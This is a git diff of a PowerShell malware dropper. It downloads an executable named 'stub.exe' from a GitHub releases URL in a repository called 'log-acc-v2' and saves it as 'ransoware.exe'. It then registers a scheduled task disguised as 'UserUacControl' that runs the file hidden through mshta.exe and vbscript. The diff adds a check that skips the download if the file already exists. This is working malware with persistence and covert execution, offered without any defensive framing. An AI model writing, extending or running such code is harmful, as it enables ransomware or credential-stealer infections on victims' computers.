@@ -18,9 +18,14 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 
 $url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/stub.exe"
-$output = "$dir\software.exe"
+$output = "$dir\ransoware.exe"
 
-Invoke-WebRequest -Uri $url -OutFile $output
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+}
+
 
 $task_name = "UserUacControl"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"$output`",0)(window.close)"
